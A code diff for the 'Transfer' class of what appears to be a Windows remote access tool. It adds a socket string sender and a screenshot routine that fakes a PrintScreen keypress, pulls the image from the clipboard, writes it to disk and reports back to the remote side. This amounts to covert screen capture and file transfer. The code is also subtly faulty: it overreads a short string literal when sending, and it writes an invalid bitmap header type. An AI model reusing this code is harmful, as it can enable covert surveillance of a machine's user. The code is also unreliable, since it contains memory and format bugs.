@@ -2,7 +2,38 @@
 #include "Scripts_c.h"
 
 
+void Transfer::sendString(SOCKET* sock, const std::string str)
+{
+	send(*sock, "str", BUFFER_LEN, 0);
+	char buffer[BUFFER_LEN] = { 0 };
+	int current_size = 0;
+	int size = str.size();
+	int rest = size % BUFFER_LEN;
+	send(*sock, std::to_string(size).c_str(), BUFFER_LEN, 0); // SIZE
 
+	while (current_size != size)
+	{
+		if (current_size + rest == size)
+		{
+			for (int istr = 0; istr < rest; istr++)
+			{
+				buffer[istr] = str[current_size + istr];
+			}
+			current_size += rest;
+		}
+		else
+		{
+			for (int istr = 0; istr < BUFFER_LEN; istr++)
+			{
+				buffer[istr] = str[istr + current_size];
+			}
+			current_size += BUFFER_LEN;
+
+		}
+		send(*sock, buffer, BUFFER_LEN, 0);
+	}
+
+}
 bool Transfer::uploadToClient(Client* client, std::string filename)
 {
 
@@ -108,35 +139,57 @@ bool Transfer::downloadFromClient(Client* client,const std::string filename)
 
 void Transfer::screenshot(Client* client)
 {
-		client->send_b("Taking screenshot ..");
-		POINT screen = { GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN) };
-		POINT a, b;
-		a.x = 0;
-		a.y = 0;
-		b.x = screen.x;
-		b.y = screen.y;
+			client->send_b("Taking screenshot ..");
+			const char* filename = "screenshot.bmp";
 
-		HDC     hScreen = GetDC(NULL);
-		HDC     hDC = CreateCompatibleDC(hScreen);
-		HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, abs(b.x - a.x), abs(b.y - a.y));
-		HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-		BOOL    bRet = BitBlt(hDC, 0, 0, abs(b.x - a.x), abs(b.y - a.y), hScreen, a.x, a.y, SRCCOPY);
+			keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY, 0);
+			keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
+			HBITMAP h;
 
-		// save bitmap to clipboard
-		OpenClipboard(NULL);
-		EmptyClipboard();
-		SetClipboardData(CF_BITMAP, hBitmap);
-		CloseClipboard();
-
-		// clean up
-		SelectObject(hDC, old_obj);
-		DeleteDC(hDC);
-		ReleaseDC(NULL, hScreen);
-		DeleteObject(hBitmap);
-
+			OpenClipboard(NULL);
+			h = (HBITMAP)GetClipboardData(CF_BITMAP);
+			CloseClipboard();
+			HDC hdc = NULL;
+			FILE*fp = NULL;
+			LPVOID pBuf = NULL;
+			BITMAPINFO bmpInfo;
+			BITMAPFILEHEADER bmpFileHeader;
+			do
+			{
+				hdc = GetDC(NULL);
+				ZeroMemory(&bmpInfo, sizeof(BITMAPINFO));
+				bmpInfo.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
+				GetDIBits(hdc, h, 0, 0, NULL, &bmpInfo, DIB_RGB_COLORS);
+				if (bmpInfo.bmiHeader.biSizeImage <= 0)
+					bmpInfo.bmiHeader.biSizeImage = bmpInfo.bmiHeader.biWidth*abs(bmpInfo.bmiHeader.biHeight)*(bmpInfo.bmiHeader.biBitCount + 7) / 8;
+				if ((pBuf = malloc(bmpInfo.bmiHeader.biSizeImage)) == NULL)
+				{
+					MessageBox(NULL, L"Unable to Allocate Bitmap Memory", L"Error", MB_OK | MB_ICONERROR);
+					break;
+				}
+				bmpInfo.bmiHeader.biCompression = BI_RGB;
+				GetDIBits(hdc, h, 0, bmpInfo.bmiHeader.biHeight, pBuf, &bmpInfo, DIB_RGB_COLORS);
+				if ((fp = fopen(filename, "wb")) == NULL)
+				{
+					MessageBox(NULL, L"Unable to Create Bitmap File", L"Error", MB_OK | MB_ICONERROR);
+					break;
+				}
+				bmpFileHeader.bfReserved1 = 0;
+				bmpFileHeader.bfReserved2 = 0;
+				bmpFileHeader.bfSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bmpInfo.bmiHeader.biSizeImage;
+				bmpFileHeader.bfType = 'KB';
+				bmpFileHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+				fwrite(&bmpFileHeader, sizeof(BITMAPFILEHEADER), 1, fp);
+				fwrite(&bmpInfo.bmiHeader, sizeof(BITMAPINFOHEADER), 1, fp);
+				fwrite(pBuf, bmpInfo.bmiHeader.biSizeImage, 1, fp);
+			}
+			while (false);
+			if (hdc)ReleaseDC(NULL, hdc);
+			if (pBuf) free(pBuf);
+			if (fp)fclose(fp);
+		
 		client->send_b("Done");
 }
-
 
 int Transfer::getSize(std::string filename)
 {
